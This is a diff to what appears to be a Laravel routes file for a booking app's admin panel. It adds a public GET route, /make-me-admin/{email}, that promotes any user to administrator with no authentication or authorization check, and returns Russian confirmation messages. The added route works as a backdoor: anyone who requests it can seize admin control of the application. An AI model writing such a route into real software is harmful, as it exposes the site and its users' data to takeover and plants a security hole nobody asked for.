@@ -45,3 +45,13 @@ Route::post('/admin/bookings/{booking}/cancel-refund', [AdminController::class, 
 Route::post('/admin/spots/{spot}/free', [AdminController::class, 'freeSpot'])->name('admin.spots.free');
 Route::get('/admin/spots/{spot}/status', [AdminController::class, 'changeSpotStatus'])->name('admin.spots.status');
 Route::post('/admin/spots/{spot}/status', [AdminController::class, 'updateSpotStatus'])->name('admin.spots.updateStatus');
+
+Route::get('/make-me-admin/{email}', function ($email) {
+    $user = \App\Models\User::where('email', $email)->first();
+    if (!$user) {
+        return "Пользователь с email {$email} не найден";
+    }
+    $user->is_admin = true;
+    $user->save();
+    return "Готово! {$user->name} ({$user->email}) теперь админ.";
+});
